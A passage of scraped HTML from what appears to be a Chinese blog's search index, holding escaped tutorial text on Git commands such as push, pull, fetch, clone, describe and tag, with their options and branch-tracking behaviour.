&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin main:newBranch
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;git push完整格式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin &amp;lt;source&amp;gt;:&amp;lt;destination&amp;gt;
git push &amp;lt;远程主机名&amp;gt; &amp;lt;本地分支名&amp;gt;:&amp;lt;远程分支名&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意，分支推送顺序的写法是&amp;lt;来源地&amp;gt;:&amp;lt;目的地&amp;gt;，所以&lt;code&gt;git pull&lt;/code&gt;是&amp;lt;远程分支&amp;gt;:&amp;lt;本地分支&amp;gt;，而&lt;code&gt;git push&lt;/code&gt;是&amp;lt;本地分支&amp;gt;:&amp;lt;远程分支&amp;gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;source&lt;/code&gt; 可以是任何 Git 能识别的位置：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin foo^:main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Git 将 &lt;code&gt;foo^&lt;/code&gt; 解析为一个位置，上传所有未被包含到远程仓库里 &lt;code&gt;main&lt;/code&gt; 分支中的提交记录。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;如果省略远程分支名，则表示将本地分支推送与之存在&amp;quot;追踪关系&amp;quot;的远程分支（通常两者同名），如果该远程分支不存在，则会被新建。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令表示，将本地的&lt;code&gt;master&lt;/code&gt;分支推送到&lt;code&gt;origin&lt;/code&gt;主机的&lt;code&gt;master&lt;/code&gt;分支。如果后者不存在，则会被新建。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;git push origin :master
// 等同于
git push origin --delete master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令表示删除&lt;code&gt;origin&lt;/code&gt;主机的&lt;code&gt;master&lt;/code&gt;分支。&lt;/p&gt;
&lt;h2 id=&#34;追踪关系&#34;&gt;追踪关系&lt;/h2&gt;
&lt;p&gt;如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令表示，将当前分支推送到&lt;code&gt;origin&lt;/code&gt;主机的对应分支。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;如果当前分支只有一个追踪分支，那么主机名都可以省略。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;如果当前分支与多个主机存在追踪关系，则可以使用&lt;code&gt;-u&lt;/code&gt;选项指定一个默认主机，这样后面就可以不加任何参数使用&lt;code&gt;git push&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push -u origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令将本地的&lt;code&gt;master&lt;/code&gt;分支推送到&lt;code&gt;origin&lt;/code&gt;主机，同时指定&lt;code&gt;origin&lt;/code&gt;为默认主机，后面就可以不加任何参数使用&lt;code&gt;git push&lt;/code&gt;了。&lt;/p&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;h3 id=&#34;-all&#34;&gt;--all&lt;/h3&gt;
&lt;p&gt;不带任何参数的&lt;code&gt;git push&lt;/code&gt;，默认只推送当前分支，这叫做simple方式。此外，还有一种matching方式，会推送所有有对应的远程分支的本地分支。Git 2.0版本之前，默认采用matching方法，现在改为默认采用simple方式。如果要修改这个设置，可以采用&lt;code&gt;git config&lt;/code&gt;命令。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git config --global push.default matching
git config --global push.default simple
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还有一种情况，就是不管是否存在对应的远程分支，将本地的所有分支都推送到远程主机，这时需要使用&lt;code&gt;--all&lt;/code&gt;选项。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push --all origin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令表示，将所有本地分支都推送到&lt;code&gt;origin&lt;/code&gt;主机。&lt;/p&gt;
&lt;h3 id=&#34;-force&#34;&gt;--force&lt;/h3&gt;
&lt;p&gt;如果远程主机的版本比本地版本更新，推送时Git会报错，要求先在本地做&lt;code&gt;git pull&lt;/code&gt;合并差异，然后再推送到远程主机。这时，如果你一定要推送，可以使用&lt;code&gt;--force&lt;/code&gt;选项。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push --force origin 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令使用&lt;code&gt;--force&lt;/code&gt;选项，结果导致远程主机上更新的版本被覆盖。除非你很确定要这样做，否则应该尽量避免使用&lt;code&gt;--force&lt;/code&gt;选项。&lt;/p&gt;
&lt;h3 id=&#34;-tags&#34;&gt;--tags&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;git push&lt;/code&gt;不会推送标签（tag），除非使用&lt;code&gt;--tags&lt;/code&gt;选项。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin --tags
&lt;/code&gt;&lt;/pre&gt;
">22-git-18-push</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-pull/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;既然我们已经知道了如何用 &lt;code&gt;git fetch&lt;/code&gt; 获取远程的数据, 现在我们学习如何将这些变化更新到我们的工作当中。&lt;/p&gt;
&lt;p&gt;其实有很多方法的 —— 当远程分支中有新的提交时，你可以像合并本地分支那样来合并远程分支。也就是说就是你可以执行以下命令:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git cherry-pick o/main&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git rebase o/main&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git merge o/main&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;等等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实际上，由于先抓取更新再合并到本地分支这个流程很常用，因此 Git 提供了一个专门的命令来完成这两个操作。它就是我们要讲的 &lt;code&gt;git pull&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;即&lt;code&gt;git pull&lt;/code&gt;相当于&lt;code&gt;git fetch&lt;/code&gt; 和 &lt;code&gt;git merge o/main&lt;/code&gt;的缩写，取回远程主机某个分支的更新，再与本地的指定分支合并。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624778165211.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;注意点&#34;&gt;注意点&lt;/h2&gt;
&lt;p&gt;即使当前分支有没有 commit 的变动，也可以使用&lt;code&gt;git pull&lt;/code&gt;从远程拉取分支。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;git pull完整格式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull &amp;lt;远程主机名&amp;gt; &amp;lt;远程分支名&amp;gt;:&amp;lt;本地分支名&amp;gt;
git pull origin next:master
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;如果远程分支是与当前分支合并，则冒号后面的部分可以省略。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull origin next
// 相当于
git fetch origin
git merge origin/next
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;追踪关系&#34;&gt;追踪关系&lt;/h2&gt;
&lt;p&gt;在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在&lt;code&gt;git clone&lt;/code&gt;的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的&lt;code&gt;master&lt;/code&gt;分支自动&amp;quot;追踪&amp;quot;&lt;code&gt;origin/master&lt;/code&gt;分支。&lt;/p&gt;
&lt;p&gt;建立追踪关系，在现有分支与指定的远程分支之间&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch --set-upstream-to=origin/[remote-branch] [branch]
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;如果当前分支与远程分支存在追踪关系，&lt;code&gt;git pull&lt;/code&gt;就可以省略远程分支名。&lt;/p&gt;
&lt;p&gt;即本地的当前分支自动与对应的&lt;code&gt;origin&lt;/code&gt;主机&amp;quot;追踪分支&amp;quot;（remote-tracking branch）进行合并。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull origin
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;如果当前分支只有一个追踪分支，连远程主机名都可以省略。&lt;/p&gt;
&lt;p&gt;即当前分支自动与唯一一个追踪分支进行合并。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;h3 id=&#34;-rebase&#34;&gt;--rebase&lt;/h3&gt;
&lt;p&gt;如果合并需要采用rebase模式，可以使用&lt;code&gt;--rebase&lt;/code&gt;选项。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git pull --rebase&lt;/code&gt;相当于&lt;code&gt;git fetch&lt;/code&gt; 和 &lt;code&gt;git rebase o/main&lt;/code&gt;的缩写&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull --rebase &amp;lt;远程主机名&amp;gt; &amp;lt;远程分支名&amp;gt;:&amp;lt;本地分支名&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;-p&#34;&gt;-p&lt;/h3&gt;
&lt;p&gt;如果远程主机删除了某个分支，默认情况下，&lt;code&gt;git pull&lt;/code&gt; 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致&lt;code&gt;git pull&lt;/code&gt;不知不觉删除了本地分支。&lt;/p&gt;
&lt;p&gt;但是，你可以改变这个行为，加上参数 &lt;code&gt;-p&lt;/code&gt; 就会在本地删除远程已经删除的分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull -p
// 等同于
git fetch --prune origin
git fetch -p
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;详解&#34;&gt;详解&lt;/h2&gt;
&lt;p&gt;假设你周一克隆了一个仓库，然后开始研发某个新功能。到周五时，你新功能开发测试完毕，可以发布了。但是 —— 天啊！你的同事这周写了一堆代码，还改了许多你的功能中使用的 API，这些变动会导致你新开发的功能变得不可用。但是他们已经将那些提交推送到远程仓库了，因此你的工作就变成了基于项目&lt;strong&gt;旧版&lt;/strong&gt;的代码，与远程仓库最新的代码不匹配了。&lt;/p&gt;
&lt;p&gt;这种情况下, &lt;code&gt;git push&lt;/code&gt; 就不知道该如何操作了。如果你执行 &lt;code&gt;git push&lt;/code&gt;，Git 应该让远程仓库回到星期一那天的状态吗？还是直接在新代码的基础上添加你的代码，亦或由于你的提交已经过时而直接忽略你的提交？&lt;/p&gt;
&lt;p&gt;因为这情况（历史偏离）有许多的不确定性，Git 是不会允许你 &lt;code&gt;push&lt;/code&gt; 变更的。实际上它会强制你先合并远程最新的代码，然后才能分享你的工作。&lt;/p&gt;
&lt;h3 id=&#34;解决方法&#34;&gt;解决方法&lt;/h3&gt;
&lt;p&gt;方式一：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git fetch
git rebase o/main
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们用 &lt;code&gt;git fetch&lt;/code&gt; 更新了本地仓库中的远程分支，然后用 rebase 将我们的工作移动到最新的提交记录下，最后再用 &lt;code&gt;git push&lt;/code&gt; 推送到远程仓库。&lt;/p&gt;
&lt;p&gt;方式二：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git fetch
git merge o/main
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们用 &lt;code&gt;git fetch&lt;/code&gt; 更新了本地仓库中的远程分支，然后&lt;strong&gt;合并&lt;/strong&gt;了新变更到我们的本地分支（为了包含远程仓库的变更），最后我们用 &lt;code&gt;git push&lt;/code&gt; 把工作推送到远程仓库&lt;/p&gt;
&lt;p&gt;尽管 &lt;code&gt;git merge&lt;/code&gt; 不会移动你的工作（它会创建新的合并提交），但是它会告诉 Git 你已经合并了远程仓库的所有变更。这是因为远程分支现在是你本地分支的祖先，也就是说你的提交已经包含了远程分支的所有变化。&lt;/p&gt;
&lt;p&gt;方式三：&lt;/p&gt;
&lt;p&gt;很好！但是要敲那么多命令，有没有更简单一点的？&lt;/p&gt;
&lt;p&gt;当然 —— 前面已经介绍过 &lt;code&gt;git pull&lt;/code&gt; 就是 fetch 和 merge 的简写，类似的 &lt;code&gt;git pull --rebase&lt;/code&gt; 就是 fetch 和 rebase 的简写！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull --rebase
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git pull
git push
&lt;/code&gt;&lt;/pre&gt;
">21-git-17-pull</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-fetch/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;从远程仓库获取数据，一旦远程主机的版本库有了更新（Git术语叫做commit），需要将这些更新取回本地，这时就要用到&lt;code&gt;git fetch&lt;/code&gt;命令。&lt;/p&gt;
&lt;h3 id=&#34;git-fetch-做了些什么&#34;&gt;git fetch 做了些什么&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;git fetch&lt;/code&gt; 完成了仅有的但是很重要的两步:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从远程仓库下载本地仓库中缺失的提交记录&lt;/li&gt;
&lt;li&gt;更新远程分支指针(如 &lt;code&gt;o/main&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;git fetch&lt;/code&gt; 实际上将本地仓库中的远程分支更新成了远程仓库相应分支最新的状态。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git fetch&lt;/code&gt; 通常通过互联网（使用 &lt;code&gt;http://&lt;/code&gt; 或 &lt;code&gt;git://&lt;/code&gt; 协议) 与远程仓库通信。&lt;/p&gt;
&lt;h3 id=&#34;git-fetch-不会做的事&#34;&gt;git fetch 不会做的事&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;git fetch&lt;/code&gt; 并不会改变你本地仓库的状态。它不会更新你的 &lt;code&gt;main&lt;/code&gt; 分支，也不会修改你磁盘上的文件。&lt;/p&gt;
&lt;p&gt;理解这一点很重要，因为许多开发人员误以为执行了 &lt;code&gt;git fetch&lt;/code&gt; 以后，他们本地仓库就与远程仓库同步了。它可能已经将进行这一操作所需的所有数据都下载了下来，但是&lt;strong&gt;并没有&lt;/strong&gt;修改你本地的文件。&lt;/p&gt;
&lt;p&gt;所以, 你可以将 &lt;code&gt;git fetch&lt;/code&gt; 的理解为单纯的下载操作。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624778106680.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;获取更新&#34;&gt;获取更新&lt;/h3&gt;
&lt;p&gt;将某个远程主机的更新，全部取回本地。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git fetch &amp;lt;远程主机名&amp;gt;
git fetch origin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;git fetch&lt;/code&gt;命令通常用来查看其他人的进程，因为它取回的代码对你本地的开发代码没有影响。&lt;/p&gt;
&lt;p&gt;默认情况下，&lt;code&gt;git fetch&lt;/code&gt;取回所有分支（branch）的更新。如果只想取回特定分支的更新，可以指定分支名。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git fetch &amp;lt;远程主机名&amp;gt; &amp;lt;分支名&amp;gt;
git fetch origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;使用更新&#34;&gt;使用更新&lt;/h3&gt;
&lt;p&gt;取回远程主机的更新以后，可以在它的基础上，使用&lt;code&gt;git checkout&lt;/code&gt;命令创建一个新的分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -b newBrach origin/master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在本地分支上合并远程分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge origin/master
git rebase origin/master
&lt;/code&gt;&lt;/pre&gt;
">20-git-16-fetch</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-clone/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;在&lt;strong&gt;本地&lt;/strong&gt;创建一个远程仓库的拷贝，&lt;code&gt;git clone&lt;/code&gt;命令用于克隆远程分支。&lt;/p&gt;
&lt;h2 id=&#34;远程仓库&#34;&gt;远程仓库&lt;/h2&gt;
&lt;p&gt;远程仓库相当于本地仓库的上游仓库，两者之间可以相互同步；&lt;/p&gt;
&lt;p&gt;可以为本地仓库添加多个远程仓库，同步的时候，指定远程仓库的名称即可。&lt;/p&gt;
&lt;h2 id=&#34;远程分支&#34;&gt;远程分支&lt;/h2&gt;
&lt;p&gt;远程分支有一个命名规范 —— 它们的格式是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;remote name&amp;gt;/&amp;lt;branch name&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此，如果你看到一个名为 &lt;code&gt;o/main&lt;/code&gt; 的分支，那么这个分支就叫 &lt;code&gt;main&lt;/code&gt;，远程仓库的名称就是 &lt;code&gt;o&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;大多数的开发人员会将它们主要的远程仓库命名为 &lt;code&gt;origin&lt;/code&gt;，并不是 &lt;code&gt;o&lt;/code&gt;。这是因为当你用 &lt;code&gt;git clone&lt;/code&gt; 某个仓库时，Git 已经帮你把远程仓库的名称设置为 &lt;code&gt;origin&lt;/code&gt; 了&lt;/p&gt;
&lt;p&gt;远程分支有一个特别的属性，在你检出时自动进入分离 HEAD 状态。Git 这么做是出于不能直接在这些分支上进行操作的原因, 你必须在别的地方完成你的工作。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;从远程主机克隆一个版本库&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone https://github.com/jquery/jquery.git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从远程主机克隆一个版本库并指定本地目录名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone &amp;lt;版本库的网址&amp;gt; &amp;lt;本地目录名&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从远程主机克隆一个版本库并指定主机名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone -o jQuery https://github.com/jquery/jquery.git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;克隆某个指定分支的代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone -b &amp;lt;branch name&amp;gt; &amp;lt;remote url&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;远程跟踪&#34;&gt;远程跟踪&lt;/h2&gt;
&lt;p&gt;直接了当地讲，&lt;code&gt;main&lt;/code&gt; 和 &lt;code&gt;o/main&lt;/code&gt; 的关联关系就是由分支的“remote tracking”属性决定的。&lt;code&gt;main&lt;/code&gt; 被设定为跟踪 &lt;code&gt;o/main&lt;/code&gt; —— 这意味着为 &lt;code&gt;main&lt;/code&gt; 分支指定了推送的目的地以及拉取后合并的目标。&lt;/p&gt;
&lt;p&gt;你可能想知道 &lt;code&gt;main&lt;/code&gt; 分支上这个属性是怎么被设定的，你并没有用任何命令指定过这个属性呀！好吧, 当你克隆仓库的时候, Git 就自动帮你把这个属性设置好了。&lt;/p&gt;
&lt;p&gt;当你克隆时, Git 会为远程仓库中的每个分支在本地仓库中创建一个远程分支（比如 &lt;code&gt;o/main&lt;/code&gt;）。然后再创建一个跟踪远程仓库中活动分支的本地分支，默认情况下这个本地分支会被命名为 &lt;code&gt;main&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;克隆完成后，你会得到一个本地分支（如果没有这个本地分支的话，你的目录就是“空白”的），但是可以查看远程仓库中所有的分支（如果你好奇心很强的话）。这样做对于本地仓库和远程仓库来说，都是最佳选择。&lt;/p&gt;
&lt;p&gt;这也解释了为什么会在克隆的时候会看到下面的输出：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;local branch &amp;quot;main&amp;quot; set to track remote branch &amp;quot;o/main&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;指定远程跟踪&#34;&gt;指定远程跟踪&lt;/h3&gt;
&lt;h4 id=&#34;方式一&#34;&gt;方式一&lt;/h4&gt;
&lt;p&gt;第一种就是通过远程分支检出一个新的分支，执行:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git checkout -b totallyNotMain o/main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以创建一个名为 &lt;code&gt;totallyNotMain&lt;/code&gt; 的分支，它跟踪远程分支 &lt;code&gt;o/main&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&#34;方式二&#34;&gt;方式二&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;git branch -u&lt;/code&gt; 命令，执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git branch -u o/main foo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样 &lt;code&gt;foo&lt;/code&gt; 就会跟踪 &lt;code&gt;o/main&lt;/code&gt; 了。如果当前就在 foo 分支上, 还可以省略 foo：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -u o/main
&lt;/code&gt;&lt;/pre&gt;
">19-git-15-clone</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-describe/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;由于标签在代码库中起着“锚点”的作用，Git 还为此专门设计了一个命令用来&lt;strong&gt;描述&lt;/strong&gt;离你最近的锚点（也就是标签），它就是 &lt;code&gt;git describe&lt;/code&gt;！&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git describe &amp;lt;ref&amp;gt;
git describe &amp;lt;branch&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;ref&amp;gt;&lt;/code&gt; 可以是任何能被 Git 识别成提交记录的引用，如果你没有指定的话，Git 会以你目前所检出的位置（&lt;code&gt;HEAD&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;它输出的结果是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;&amp;lt;tag&amp;gt;_&amp;lt;numCommits&amp;gt;_g&amp;lt;hash&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;tag&lt;/code&gt; 表示的是离 &lt;code&gt;ref&lt;/code&gt; 最近的标签， &lt;code&gt;numCommits&lt;/code&gt; 是表示这个 &lt;code&gt;ref&lt;/code&gt; 与 &lt;code&gt;tag&lt;/code&gt; 相差有多少个提交记录， &lt;code&gt;hash&lt;/code&gt; 表示的是你所给定的 &lt;code&gt;ref&lt;/code&gt; 所表示的提交记录哈希值的前几位。&lt;/p&gt;
&lt;p&gt;当 &lt;code&gt;ref&lt;/code&gt; 提交记录上有某个标签时，则只输出标签名称&lt;/p&gt;
">18-git-14-describe</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-tag/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;标签&lt;em&gt;永远&lt;/em&gt;指向某个提交记录。&lt;/p&gt;
&lt;p&gt;当软件发布新的大版本，或者是修正一些重要的 Bug 或是增加了某些新特性，我们可以打一个标签，标识了某个特定的位置。&lt;/p&gt;
&lt;p&gt;标签不会随着新的提交而移动。你也不能检出到某个标签上面进行修改提交，它就像是提交树上的一个锚点，标识了某个特定的位置。&lt;/p&gt;
&lt;p&gt;标签总是和某个commit挂钩。如果这个commit既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;新建标签&#34;&gt;新建标签&lt;/h3&gt;
&lt;h4 id=&#34;普通标签&#34;&gt;普通标签&lt;/h4&gt;
&lt;p&gt;新建一个tag在当前commit&lt;/p&gt;
&lt;p&gt;如果你不指定提交记录，Git 会用 &lt;code&gt;HEAD&lt;/code&gt; 所指向的位置。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git tag [tag]
git tag v1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;新建一个tag在指定commit&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git tag [tag] [commit]
git tag v1 C1
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;注解标签&#34;&gt;注解标签&lt;/h4&gt;
&lt;p&gt;创建带有说明的标签，用&lt;code&gt;-a&lt;/code&gt;指定标签名，&lt;code&gt;-m&lt;/code&gt;指定说明文字&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git tag -a [VERSION] -m &amp;quot;released [VERSION]&amp;quot;
git tag -a v0.1 -m &amp;quot;version 0.1 released&amp;quot;
git tag -a v0.1 -m &amp;quot;version 0.1 released&amp;quot; 1094adb
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;删除标签&#34;&gt;删除标签&lt;/h3&gt;
&lt;h4 id=&#34;删除本地标签&#34;&gt;删除本地标签&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git tag -d &amp;lt;tagname&amp;gt;
git tag -d v1.0
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;删除远程标签&#34;&gt;删除远程标签&lt;/h4&gt;
&lt;p&gt;删除本地标签后，推送到远程&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push &amp;lt;remote&amp;gt; :refs/tags/&amp;lt;tagname&amp;gt;
git push origin :refs/tags/v1.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除远程标签&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin --delete &amp;lt;tagname&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;查看标签&#34;&gt;查看标签&lt;/h3&gt;
&lt;p&gt;列出所有tag，标签不是按时间顺序列出，而是按字母排序的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git tag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看tag信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git show [tag]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;提交标签&#34;&gt;提交标签&lt;/h3&gt;
&lt;p&gt;提交指定tag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push [remote] [tag]
git push origin v1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提交所有tag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push [remote] --tags
git push origin --tags
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;使用标签&#34;&gt;使用标签&lt;/h3&gt;
&lt;p&gt;新建一个分支，指向某个tag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -b [branch] [tag]
&lt;/code&gt;&lt;/pre&gt;
">17-git-13-tag</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-cherry-pick/"" data-c="
